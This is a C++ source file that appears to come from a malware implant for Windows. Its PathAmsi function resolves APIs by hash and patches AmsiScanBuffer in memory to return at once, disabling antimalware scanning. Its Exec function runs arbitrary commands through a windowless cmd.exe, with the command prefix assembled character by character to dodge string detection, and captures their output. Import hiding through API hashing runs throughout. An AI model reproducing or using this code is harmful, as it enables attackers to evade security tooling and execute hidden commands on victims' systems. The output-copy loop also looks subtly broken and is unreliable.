#include "Custom.h"
#include "CRT.h"
#include "ApiResolve.h"
#include "HashString.h"

void PathAmsi() {
    ApiResolve api;
    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
    LPVOID lpKernel32 = api.GetModuleBaseAddress(hashKernel32);

    constexpr unsigned int hashAmsi = ComplexHashForAnsi("amsi.dll");
    LPVOID lpAmsi = api.GetModuleBaseAddress(hashAmsi);
    if (lpAmsi == NULL) {
        return;
    }

    typedef enum {
        AMSI_RESULT_CLEAN = 0
    } AMSI_RESULT;

    typedef HRESULT(WINAPI* _AmsiScanBuffer)(PVOID, LPCWSTR, DWORD, PVOID, PVOID, AMSI_RESULT*);

    constexpr unsigned int hashAmsiScanBuffer = ComplexHashForAnsi("AmsiScanBuffer");
    _AmsiScanBuffer pAmsiScanBuffer = (_AmsiScanBuffer)api.GetApiAddress(lpAmsi, hashAmsiScanBuffer);

    BYTE* target = (BYTE*)pAmsiScanBuffer;
    if (*target == 0xC3) {
        return;
    }

    DWORD oldProtect, oldProtect2;
    typedef BOOL
    (WINAPI*
        _VirtualProtect)(
            _In_  LPVOID lpAddress,
            _In_  SIZE_T dwSize,
            _In_  DWORD flNewProtect,
            _Out_ PDWORD lpflOldProtect
            );

    constexpr unsigned int hashVirtualProtect = ComplexHashForAnsi("VirtualProtect");
    _VirtualProtect pVirtualProtect = (_VirtualProtect)api.GetApiAddress(lpKernel32, hashVirtualProtect);
    
    // Patch
    if (!pVirtualProtect(target, 4, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return;
    }

    target[0] = 0xC3;
    target[1] = 0x90;
    target[2] = 0x90;
    target[3] = 0x90;

    pVirtualProtect(target, 4, oldProtect, &oldProtect2);

    //FlushInstructionCache(GetCurrentProcess(), target, 4);
}

wchar_t* CharToWChar(const char* str)
{
    if (str == NULL)
        return NULL;

    ApiResolve api;
    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
    LPVOID lpKernel32 = api.GetModuleBaseAddress(hashKernel32);

    typedef int
    (WINAPI*
        _MultiByteToWideChar)(
            _In_ UINT CodePage,
            _In_ DWORD dwFlags,
            _In_NLS_string_(cbMultiByte) LPCCH lpMultiByteStr,
            _In_ int cbMultiByte,
            _Out_writes_to_opt_(cchWideChar, return) LPWSTR lpWideCharStr,
            _In_ int cchWideChar
            );

    constexpr unsigned int hashMultiByteToWideChar = ComplexHashForAnsi("MultiByteToWideChar");
    _MultiByteToWideChar pMultiByteToWideChar = (_MultiByteToWideChar)api.GetApiAddress(lpKernel32, hashMultiByteToWideChar);
    int len = pMultiByteToWideChar(
        CP_UTF8,        // hoặc CP_ACP nếu là ANSI
        0,
        str,
        -1,
        NULL,
        0);

    if (len == 0)
        return NULL;

    wchar_t* wstr = (wchar_t*)crt_malloc(len * sizeof(wchar_t));
    if (wstr == NULL)
        return NULL;

    if (pMultiByteToWideChar(
        CP_UTF8,
        0,
        str,
        -1,
        wstr,
        len) == 0)
    {
        crt_free(wstr);
        return NULL;
    }

    return wstr;
}

BOOL Exec(const wchar_t* command, wchar_t** output)
{
    if (!command || !output)
        return FALSE;

    *output = NULL;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

    HANDLE hRead = NULL;
    HANDLE hWrite = NULL;

    ApiResolve api;
    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
    LPVOID lpKernel32 = api.GetModuleBaseAddress(hashKernel32);

    typedef BOOL(WINAPI*
        _CreatePipe)(
            _Out_ PHANDLE hReadPipe,
            _Out_ PHANDLE hWritePipe,
            _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,
            _In_ DWORD nSize
            );

    constexpr unsigned int hashCreatePipe = ComplexHashForAnsi("CreatePipe");
    _CreatePipe pCreatePipe = (_CreatePipe)api.GetApiAddress(lpKernel32, hashCreatePipe);


    if (!pCreatePipe(&hRead, &hWrite, &sa, 0))
        return FALSE;

    typedef BOOL
    (WINAPI*
        _SetHandleInformation)(
            _In_ HANDLE hObject,
            _In_ DWORD dwMask,
            _In_ DWORD dwFlags
            );

    constexpr unsigned int hashSetHandleInformation = ComplexHashForAnsi("SetHandleInformation");
    _SetHandleInformation pSetHandleInformation = (_SetHandleInformation)api.GetApiAddress(lpKernel32, hashSetHandleInformation);
    pSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = { 0 };

    const wchar_t prefix[] = {
        L'c', L'm', L'd',
        L'.',
        L'e', L'x', L'e',
        L' ',
        L'/',
        L'c',
        L' ',
        L'\0'
    };

    SIZE_T cmdLen =
        crt_wcslen(prefix) +
        crt_wcslen(command) + 1;

    wchar_t* cmdLine = (wchar_t*)crt_malloc(cmdLen * sizeof(wchar_t));

    typedef BOOL
    (WINAPI*
        _CloseHandle)(
            _In_ _Post_ptr_invalid_ HANDLE hObject
            );

    constexpr unsigned int hashCloseHandle = ComplexHashForAnsi("CloseHandle");

    _CloseHandle pCloseHandle = (_CloseHandle)api.GetApiAddress(lpKernel32, hashCloseHandle);
    if (!cmdLine)
    {
        pCloseHandle(hRead);
        pCloseHandle(hWrite);
        return FALSE;
    }

    crt_wcscpy(cmdLine, prefix);
    crt_wcscat(cmdLine, command);

    typedef BOOL
    (WINAPI*
        _CreateProcessA)(
            LPCWSTR               lpApplicationName,
            LPWSTR                lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL                  bInheritHandles,
            DWORD                 dwCreationFlags,
            LPVOID                lpEnvironment,
            LPCWSTR               lpCurrentDirectory,
            LPSTARTUPINFOW        lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
            );
    constexpr unsigned int hashCreateProcessW = ComplexHashForAnsi("CreateProcessW");
    _CreateProcessA pCreateProcessW = (_CreateProcessA)api.GetApiAddress(lpKernel32, hashCreateProcessW);

    BOOL ok = pCreateProcessW(
        NULL,
        cmdLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi);

    crt_free(cmdLine);
    pCloseHandle(hWrite);

    if (!ok)
    {
        pCloseHandle(hRead);
        return FALSE;
    }

    SIZE_T capacity = 4096;
    SIZE_T used = 0;

    wchar_t* result =
        (wchar_t*)crt_malloc(
            capacity * sizeof(wchar_t));

    if (!result)
    {
        pCloseHandle(hRead);
        pCloseHandle(pi.hProcess);
        pCloseHandle(pi.hThread);
        return FALSE;
    }

    DWORD bytesRead;

    typedef BOOL
    (WINAPI*
        _ReadFile)(
            _In_ HANDLE hFile,
            _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
            _In_ DWORD nNumberOfBytesToRead,
            _Out_opt_ LPDWORD lpNumberOfBytesRead,
            _Inout_opt_ LPOVERLAPPED lpOverlapped
            );

    constexpr unsigned int hashReadFile = ComplexHashForAnsi("ReadFile");
    _ReadFile pReadFile = (_ReadFile)api.GetApiAddress(lpKernel32, hashReadFile);

    while (TRUE)
    {
        BYTE* buffer = (BYTE*)crt_malloc(4096);

        if (!pReadFile(hRead, buffer, 4096, &bytesRead, NULL)) {
            crt_free(buffer);
            break;
        }

        if (bytesRead == 0) {
            crt_free(buffer);
            break;
        }

        SIZE_T chars = bytesRead / sizeof(wchar_t);

        if (used + chars + 1 > capacity)
        {
            capacity = (used + chars + 1) * 2;

            wchar_t* tmp =
                (wchar_t*)crt_realloc(
                    result,
                    capacity * sizeof(wchar_t));

            if (!tmp)
            {
                crt_free(result);
                pCloseHandle(hRead);
                pCloseHandle(pi.hProcess);
                pCloseHandle(pi.hThread);
                return FALSE;
            }

            result = tmp;
        }

        wchar_t* wchar = CharToWChar((char*)buffer);

        crt_memcpy(
            result + used,
            wchar,
            chars * sizeof(wchar_t) * 2);
        if (wchar) {
            crt_free(wchar);
        }

        crt_free(buffer);
        //crt_wcscat(result + used, (wchar_t*)buffer);
        used += chars * 2;
    }

    result[used] = L'\0';

    typedef DWORD
    (WINAPI*
        _WaitForSingleObject)(
            _In_ HANDLE hHandle,
            _In_ DWORD dwMilliseconds
            );

    constexpr unsigned int hashWaitForSingleObject = ComplexHashForAnsi("WaitForSingleObject");

    _WaitForSingleObject pWaitForSingleObject = (_WaitForSingleObject)api.GetApiAddress(lpKernel32, hashWaitForSingleObject);

    pWaitForSingleObject(pi.hProcess, INFINITE);

    pCloseHandle(hRead);
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);

    *output = result;

    return TRUE;
}